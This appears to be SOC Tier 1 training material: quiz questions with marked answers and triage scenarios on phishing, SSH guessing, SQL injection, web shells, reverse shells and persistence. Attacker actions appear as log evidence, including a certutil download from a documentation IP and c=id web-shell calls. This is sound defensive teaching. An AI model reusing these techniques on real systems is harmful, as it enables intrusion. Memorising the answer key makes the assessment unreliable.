Compare both sign-ins (device, IP, user agent), then confirm with the user by a known channel
Right. You need facts that separate a VPN or travel from a stolen session before choosing a classification.
Ignore it because the foreign IP address is not on any of our blocklists
A blocklist only holds known-bad addresses. A new one will not be in it.

q.q: EDR confirms an unsigned program read LSASS memory on a domain controller. The EDR did not block it. Which severity and action fit best?
o: Critical: escalate now, since stolen DC credentials can expose every account
Right. A DC holds credentials for the whole domain, so confirmed theft there is among the worst cases.
Low: a single process access event is normal background noise on busy servers
LSASS access by an unsigned program is not routine.
Medium: leave it for the next shift to review when the queue is a little quieter
Delaying leaves the attacker time to use the stolen credentials.
High: investigate it within the day with the other queued items
Confirmed credential theft on a DC is contained at once. Waiting hours gives the attacker time.

q.q: Which ticket note is the best piece of documentation for an escalation?
o: 10:42 UTC WS-114 ran certutil to fetch hxxp://203.0.113.40/a.txt (EDR 8841), user jdoe. Isolated 10:47; escalated to L2.
Right. It has time, host, evidence reference, action taken and handoff, so anyone can follow it.
10:40 UTC WS-114: EDR 8841 shows certutil use by jdoe, probably an admin tool. Left open and watching, no action taken
Nothing is checked: no address, file result or action, and it assumes the tool is harmless.
10:42 UTC WS-114 user jdoe: certutil fetched a file from 203.0.113.40. Closed as false positive after jdoe said it was normal
The user's word is not evidence, and the downloaded file and address were not checked.
WS-114 alert 8841 on 20 Nov: certutil activity, host isolated and escalated to L2 (no time, address or file details noted)
The actions are right but the evidence is missing, so L2 cannot tell what was seen or when.

q.q: Timeline: 08:00 attacker gets in; 08:50 alert fires; 09:05 analyst opens it; 10:15 host contained. What is the mean time to acknowledge (MTTA) for this one incident?
o: 15 minutes
Right. MTTA runs from the alert firing (08:50) to an analyst acknowledging it (09:05).
50 minutes
That is the time from compromise to the alert, which is the time to detect.
85 minutes
That is the time from the alert to containment, which is closer to time to respond.
135 minutes
That runs from the start of the attack to containment, which measures total exposure.

q.q: In one week the SOC handled 200 alerts. After triage, 150 were closed as false positives, and 60 of those were scanner noise. What is the false positive rate, and what does it mean?
o: 25%; most alerts were real attacks, so the rules are working very well
25% is the true positive share. The false positive rate is 150 of 200.
75%; most analyst time goes to noise, so tuning is needed
Right. 150 divided by 200 is 75%. A high rate wastes time and risks missing real alerts.
30%; the share of alerts that were scanner noise
That counts only the scanner noise (60 of 200). The false positive rate counts all 150 false alerts.
300%; false positives divided by true positives (150 / 50)
The rate divides by all alerts, not by true positives, and cannot go above 100%.

q.q: Sixty of the week's 200 alerts come from the weekly vulnerability scanner. How can a lookup table best help L1?
o: Store the scanner's credentials in the table so alerts can be re-scanned
Lookup tables hold reference data. Credentials in one are a security risk and do nothing for triage.
Keep approved scanner IPs and scan windows in a table to tag matching alerts
Right. A lookup turns a repeated manual check into an automatic tag, which speeds triage and shows tuning needs.
Auto-close every alert from the scanner subnet, even for unexpected ports
That would also hide real attacks coming from that subnet or hitting unexpected ports.
Replace the scanner alerts with a weekly summary the analyst reads only if asked
A summary nobody has to read delays and hides real problems. A lookup tags alerts as they arrive.

q.q: Four alerts are open. Which one needs immediate escalation to L2?
o: A user-reported spam email with no links or attachments from an unknown sender
Spam without links is a low-priority item that L1 can close.
Confirmed beaconing from a records server to a rare outside domain
Right. A live attacker channel on a sensitive server is an active incident.
A blocked port scan from the internet
Blocked scans happen all day. The firewall did its job.
One failed admin login from a known VPN address
A single failure from a known address is routine. Note it and move on.

q.q: An EDR isolation cut off a user's laptop. Which message to the user is best?
o: Your laptop was disconnected from the network as a precaution after a security alert. Please leave it on and plugged in. We will call you within the hour.
Right. It explains what happened, tells the user what to do and says what happens next, in plain words.
Your laptop was disconnected from the network as a precaution after a security alert. Please restart it so a fresh start can clear things, then wait for our call.
Restarting can wipe memory evidence and may reconnect the laptop. The advice itself is wrong, even though the tone is fine.
Your laptop was disconnected as a precaution. Please leave it on.
The advice is right but it does not say why or what happens next, so the user is left waiting with no idea when.
Your host exhibits C2 beaconing; endpoint isolation is in effect pending IR triage and review by the next tier of analysts.
Jargon will confuse the user and tells them nothing about what to do.

q.short: Look-alike sender, bad attachment, one user clicked and ran the file.
q.scenario: You are the Tier 1 analyst on the morning shift at a small unit. The mail gateway raised an alert. Check the mail, find who clicked, and decide what to escalate.

alerts.desc: Three users got a payroll mail with Invoice_Q1.pdf. The From domain unit-payroll.example is not ours and the Reply-To goes elsewhere. The attachment hash is flagged by the gateway.

ans.why: The sender is a look-alike domain, SPF failed, Reply-To goes to another domain and the PDF hash is known bad. It is a phishing mail with a bad attachment.

cls.why: The From and Reply-To domains do not match and the hash is known bad.

esc.why: Other users may have opened it, so it needs the next tier and mail clean-up.

sev.why: Mail was delivered, but at this point nobody is shown to be hurt. Check for clicks next.

tech.why: A malicious attachment was sent by email.

host.why: These three users received the mail.

act.why: Remove the mail from every mailbox so nobody else opens it.

iocs.why: The attachment hash, a threat-intel hit.
The server that sent the mail.
Our own mail gateway, not an indicator.

alerts.desc: Antivirus quarantined a file named eicar.txt in a shared folder on FIN-06, a finance workstation.

esc.why: Nothing harmful ran, so there is nothing to escalate.

alerts.name: Proxy: program download from newly seen domain after mail click
alerts.desc: A user downloaded an .exe from invoice-portal.test, a domain no one in the unit has visited before.

ans.why: mortiz opened the phishing link and downloaded Invoice_Viewer.exe. It then ran and called out to a known bad IP. This computer is infected. jlee on WS-150 opened the same page at 10:01 but nothing shows a download; Tier 2 should check WS-150.

cls.why: The download came from the phishing domain and then ran.

esc.why: A running malicious program means Tier 2 and containment.

sev.why: Malware executed and is talking to an outside server.

tech.why: The user ran a malicious file they downloaded.

host.why: The program ran on WS-114 as mortiz.

act.why: Cut the computer off the network first, then investigate.

iocs.why: The program connected to it after running.

q.title: Tier 1 triage: SSH guessing on a Linux server
q.short: Many failed SSH logons, then a success. Check the logs and find what the attacker did.
q.scenario: You are the Tier 1 analyst. A Linux web server shows odd SSH traffic. Use the SIEM and the analyst VM (auth.log) to see if anyone got in.

alerts.name: SSH: 38 failed logons from one IP in 4 minutes
alerts.desc: One outside address tried many passwords on a few accounts on sshd on lnx-web-01 in a few minutes.

ans.why: One external IP tried many passwords against the same few accounts (deploy, root, admin) in minutes. That is password guessing, not spraying (spraying is one password against many accounts). The same IP logged in later, so escalate.

cls.why: Fast repeated failures on the same few accounts from one outside IP is a brute-force pattern.

esc.why: A login from the same IP succeeded, so this is more than noise.

sev.why: Guessing alone is common. It became worse when a login worked (next alert).

act.why: Block the attacking IP at the firewall.

iocs.why: Our admin jump host: normal key logins.

alerts.name: SSH: repeated failed logons for sjones
alerts.desc: Two failed password logons for sjones, then a success.

ans.why: sjones mistyped twice from his own desk (10.30.0.44), then logged in with his key. This is normal.

cls.why: Internal source, known user, and the same person succeeded in seconds. The rule fired, but the activity was approved or harmless, so there is nothing to act on.

esc.why: No sign of attack, so nothing to escalate.

alerts.name: SSH: successful logon from an IP that just failed repeatedly
alerts.desc: deploy logged in from 203.0.113.88, the same address that failed many times a minute ago.

ans.why: After guessing, the attacker got the deploy password, then downloaded and ran a script. The server is compromised.

cls.why: A success right after many failures from the same outside IP means the guess worked.

esc.why: A live attacker session needs Tier 2 and containment.

sev.why: An outsider has a shell and already ran a downloaded script.

tech.why: The attacker used a valid account (deploy) that it guessed.

host.why: The server and the account that was used.

act.why: Isolate the server first, then reset the deploy password.

iocs.why: The script was downloaded from here.
A staff workstation, not part of the attack.

cls.why: Fixed rhythm, same size, rare new destination.

esc.why: Likely malware on a host, so escalate and contain.

sev.why: Clear malware signs but no proof of data theft yet.

tech.why: Command and control over web traffic.

host.why: The beaconing host and its user.

act.why: Isolate the host, then block the domain.

q.title: Web attack: did the injection work?
q.short: Read access-log status codes and sizes to tell a successful SQL injection from blocked probes.
q.scenario: You are the Tier 1 analyst for the retail portal on WEB-01. Web alerts are in your queue. For each one, look at the access log: the status code and the response size (bytes) are in the log. Remember: investigating your own approved lab or site is fine. Never test attacks on systems you do not have written permission for.

alerts.name: SQL injection pattern in web requests to WEB-01
alerts.desc: WAF-style rule fired on UNION SELECT in the URL of /products.php. Source 203.0.113.45. Decide: did it work?

ans.why: The same IP tested the page with a quote, then AND 1=1 versus AND 1=2 (5342 bytes against 611), then UNION SELECT. The two UNION answers were 200 and 48-51 KB while a normal product page is about 5 KB. The extra size is database data leaving the site. This one worked. At 10:27 the same IP also read /etc/passwd through download.php (200, 1842 bytes); the shadow file was refused (403).

cls.why: Status 200 with a response ten times normal size means the injected query ran and returned data.

esc.why: Customer data left the site, so Tier 2 and the app owner must be told.

sev.why: Data was returned, probably usernames, password hashes and orders. Critical is kept for proven code execution (see a4).

tech.why: The attacker abused a flaw in a public web app.

act.why: Block 203.0.113.45 now. Tier 2 handles the app fix and the data-exposure review.

iocs.why: WEB-01 is our own server, not an indicator.
Our approved QA scanner with its own alert. Keep it out of this case.

alerts.name: Directory traversal attempts on /download.php
alerts.desc: Six requests with ../ or encoded dots from 10.20.6.30 (internal) aimed at /etc/passwd and win.ini.

ans.why: 10.20.6.30 is qa-scan. Change CHG-5101 approves a QA security test of WEB-01 from 10:00 to 11:00 with the WAF left in block mode. All six requests were refused (403, 400 or 404, 150-512 bytes) and the WAF logged each one. Compare a1: the attacker's request for /etc/passwd got 200 with 1842 bytes, and it came from outside with no ticket.

cls.why: The rule fired, but the activity was approved and refused by the WAF, so there is nothing to act on.

esc.why: An approved test with every request blocked needs no escalation. Close it with the change number.

alerts.name: Possible SQL injection: apostrophe in search query
alerts.desc: A single quote (%27) was seen in /search.php from 10.20.4.15 (internal).

ans.why: Two searches for O'Brien and D'Souza from the QA test PC. Both answered 200 with normal sizes (about 4.4 KB), no errors, no SQL words. A name with an apostrophe is not an attack.

cls.why: An internal known tester, normal answers and no SQL keywords: a harmless trigger.

esc.why: Nothing to escalate. Close it.

alerts.name: New PHP file served from /uploads on WEB-01
alerts.desc: File integrity monitoring saw /var/www/portal/uploads/s.php created. The same IP then requested it with c= commands.

ans.why: A 61-byte PHP file appeared right after an upload from 203.0.113.45, and that IP then called it with c=id and c=whoami. This is a web shell: the attacker can now run commands on WEB-01. Isolate the server and escalate.

cls.why: Uploads should never hold .php files. The attacker is already using it.

esc.why: The attacker can run commands on the server. Tier 2 and incident response must take over.

sev.why: The attacker has command execution on a public server that holds customer data.

tech.why: A web shell is a script the attacker leaves on a web server to run commands later.

host.why: Commands run on WEB-01 as the www-data web account.

act.why: Isolate WEB-01 from the network so the shell stops working, then investigate.

iocs.why: The address that uploaded and used the shell.

q.short: Use change records and context to close false positives and escalate what is real.
q.scenario: It is a Saturday morning shift. Six alerts arrive. Decide which ones are real.

alerts.name: Port scan detected from internal host 10.10.5.20
alerts.desc: One host touched ports 22, 80, 135, 139, 445 and 3389 about 14 connections to 11 hosts in 6 minutes.

ans.why: 10.10.5.20 is scanner01. Change CHG-4821 approves an authenticated vulnerability scan of 10.10.7.0/24 from 08:30 to 10:30. The traffic is in scope and in the window. Check the change record before you escalate a scan.

esc.why: Nothing is wrong. Close with a note pointing at the change number.

alerts.name: Scheduled task created on file server FS-03
alerts.desc: Event 4698: task CleanTemp created by adm_tsmith on FS-03. Scheduled tasks are a common persistence method.

ans.why: CHG-4830 approves this exact task, by this admin, on this server. The script sits in the change repo and the admin logged on from the usual admin PC. High severity does not mean bad: the context decides.

cls.why: The rule fired, but the activity was approved or harmless, so there is nothing to act on.

esc.why: Escalating an approved change wastes Tier 2's time. Close it.

alerts.name: Large outbound transfer from FS-03: about 14 GB
alerts.desc: FS-03 sent 14 GB to 10.10.9.30 over SMB in 27 minutes. Possible data exfiltration.

ans.why: 10.10.9.30 is our backup server and STD-017 covers a weekly differential backup, Saturdays at 09:00, 12-16 GB. The backup job log shows it started 09:00 and verified OK. Exfiltration usually goes to outside addresses; this went to our backup server on schedule.

cls.why: The rule fired, but the activity was approved or harmless, so there is nothing to act on.

esc.why: Standing change STD-017 explains it. Close it.

alerts.name: Rare domain visited: update-cdn.example
alerts.desc: ACCT-11 (user mlee) visited update-cdn.example. First time this domain is seen in the last 30 days.

ans.why: This is the one real alert, hidden behind a low severity. Word opened remittance_nov.docm and started wuhelper.exe from AppData. That program calls update-cdn.example (203.0.113.60) every five minutes with the same small POST. Regular timing is a beacon. Isolate ACCT-11 and escalate.

cls.why: Office app launching an unknown program, then a regular small call home: command-and-control behaviour.

esc.why: Likely malware on an accounting PC. Tier 2 needs it.

sev.why: Active malware calling its server on a finance PC. The alert said low, but the evidence is high.

tech.why: The beacon uses web requests (HTTPS POST) to talk to its server.

host.why: The beacon runs on ACCT-11 under user mlee.

act.why: Isolate ACCT-11 so the beacon cannot get new orders, then investigate.

iocs.why: Our own scanner. It is noise in this case.

alerts.name: Multiple failed logons for svc_scan on HR-07
alerts.desc: Five failed logons for svc_scan from 10.10.5.20 in 6 seconds.

ans.why: svc_scan is the scanner's account and 10.10.5.20 is scanner01. Event status 0xC000006A means a bad password, and ticket TKT-7730 says the scanner's credential for HR-07 expired. One account, one host, one source, no success after it: a stale password, not guessing.

cls.why: The rule fired, but the activity was approved or harmless, so there is nothing to act on.

esc.why: Not an attack. The vuln team already has a ticket. Close it.

alerts.name: Port scan resumed from 10.10.5.20

cls.why: The rule fired, but the activity was approved or harmless, so there is nothing to act on.

q.title: After the break-in: shell and persistence
q.short: Use endpoint evidence (process tree, Run key, new service) to prove an attacker has a foothold and is trying to stay.
q.scenario: An alert fired on WS-22 after a user opened an emailed invoice. Four alerts are in your queue. Use endpoint logs, the process tree and change records to decide what is real. You are only reading evidence. Do not try anything like this outside a lab you own or have written permission for.

alerts.name: Reverse shell: program on WS-22 connected to 203.0.113.80:4444 and started cmd.exe
alerts.desc: invoice_update.exe on WS-22 opened a TCP session to 203.0.113.80:4444 and started cmd.exe. Port 4444 is rarely used in our network.

ans.why: Process tree: Outlook opened invoice_Q3.docm, Word started invoice_update.exe from Temp, and that program made the 4444 connection and then started cmd.exe. cmd.exe ran whoami, ipconfig and net group. That is a reverse shell: the attacker has a command prompt on WS-22 through a connection the PC opened itself.

cls.why: Office app launching an unknown program that opens an outbound shell, then recon commands: a live intrusion.

esc.why: The attacker has hands-on access. Tier 2 must contain and scope it.

sev.why: Active remote shell on a user PC with domain recon already done. Not yet critical: no sign of data theft or domain admin use.

tech.why: The alert is about the shell, so pick the technique for cmd.exe, not the lure.

host.why: The shell runs on WS-22 under kpatel.

act.why: Isolate WS-22 now to cut the session.

iocs.why: The program that opened the shell.
Normal web traffic from the same PC. It is not an indicator.

alerts.name: New service installed on WS-30
alerts.desc: Event 7045: service AgentSvc installed on WS-30 running as LocalSystem.

ans.why: CHG-5012 approves rolling out this monitoring agent. A deployment tool ran msiexec, the file is in Program Files and the signature is valid. A new service alone is not proof of malice.

cls.why: The rule fired, but the activity was approved or harmless, so there is nothing to act on.

esc.why: Nothing to escalate. Close it with the change number.

alerts.name: Run key changed on WS-22: OneSync
alerts.desc: Registry value OneSync added to HKCU Run on WS-22 by a program that is also talking to 203.0.113.80. Programs in this key start at every logon.

ans.why: The value points to osync.exe in AppData\Roaming\Sync, a file written at 13:55 by the same invoice_update.exe. The name copies OneDrive to blend in. If WS-22 is rebooted, the attacker's program starts again. That is persistence.

cls.why: Created by the malicious process, minutes after the shell opened.

esc.why: Persistence means the attacker plans to stay. Tier 2 must remove it.

sev.why: Part of an active intrusion on the same PC.

tech.why: Run keys are the classic registry autostart place.

host.why: The key belongs to kpatel on WS-22.

act.why: Isolate first. Tier 2 removes the key and file afterwards.

iocs.why: The real OneDrive entry is normal.

alerts.name: New auto-start service WinUpdSvc on WS-22
alerts.desc: Event 7045: WinUpdSvc installed on WS-22, LocalSystem, image in C:\ProgramData\wupd. WS-22 still has a session open to 203.0.113.80.

ans.why: Created by sc.exe under the same cmd.exe that invoice_update.exe started. The binary is unsigned, sits in ProgramData and runs as LocalSystem, the most powerful local account. The attacker now has two ways back in (Run key and service) and system-level rights.

cls.why: Parent process is the malicious program, and the file is unsigned. No change record exists.

esc.why: System-level persistence needs incident response.

sev.why: Runs as LocalSystem on a PC with an open attacker shell. The attacker holds full control of this machine.

tech.why: A new auto-start service is how the attacker keeps system-level access.

host.why: The service was installed on WS-22.

act.why: Isolate WS-22. It is the only way to stop a system-level attacker.

iocs.why: Attacker listener linked to the same chain.
The valid agent on WS-30 belongs to another alert.
